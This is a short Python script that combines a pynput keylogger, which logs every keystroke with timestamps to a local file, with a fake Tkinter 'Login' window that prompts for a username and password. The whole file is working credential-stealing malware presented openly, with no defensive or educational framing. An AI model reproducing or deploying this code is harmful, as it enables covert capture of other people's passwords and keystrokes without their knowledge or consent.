import logging
from pynput.keyboard import Key, Listener
from tkinter import Tk, Label, Entry, Button

# Configure logging
log_dir = r"C:\Users\Ed\Downloads\Keylogger"
logging.basicConfig(filename=(log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Keylogging function
def on_press(key):
    logging.info(str(key))

# GUI setup
def create_fake_ui():
    # Create main window
    window = Tk()
    window.title("Login")
    window.geometry("300x150")

    # Username label and text entry box
    username_label = Label(window, text="Username")
    username_label.pack()
    username_entry = Entry(window, width=30)
    username_entry.pack()

    # Password label and text entry box
    password_label = Label(window, text="Password")
    password_label.pack()
    password_entry = Entry(window, width=30, show='*')
    password_entry.pack()

    # Login button
    login_button = Button(window, text="Login", command=window.destroy)
    login_button.pack()

    # Run the application
    window.mainloop()

# Start key listener in a separate thread
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Run the keylogger and GUI concurrently
import threading

# Start the GUI in the main thread
gui_thread = threading.Thread(target=create_fake_ui)
gui_thread.start()

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Wait for both threads to complete
gui_thread.join()
keylogger_thread.join()
